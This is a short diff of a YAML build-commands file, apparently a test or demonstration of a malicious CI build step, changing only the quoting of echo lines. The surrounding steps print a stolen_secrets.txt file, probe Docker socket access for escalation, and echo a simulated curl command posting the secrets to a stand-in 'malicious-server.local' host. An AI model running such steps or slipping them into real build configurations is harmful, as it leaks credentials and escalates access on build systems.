@@ -22,11 +22,11 @@ build_commands:
   - cat stolen_secrets.txt
   
   # Attempt Docker socket access (additional escalation)
-  - 'echo "Attempting Docker access:"'
+  - echo "Attempting Docker access:"
   - 'docker ps 2>/dev/null || echo "Docker not accessible"'
   
   # Simulated data exfiltration
   - 'echo "Simulating data exfiltration..."'
   - 'echo "curl -X POST https://malicious-server.local/exfil -d @stolen_secrets.txt"'
   
-  - 'echo "\'Legitimate\' commands completed"'
+  - echo "'Legitimate' commands completed"
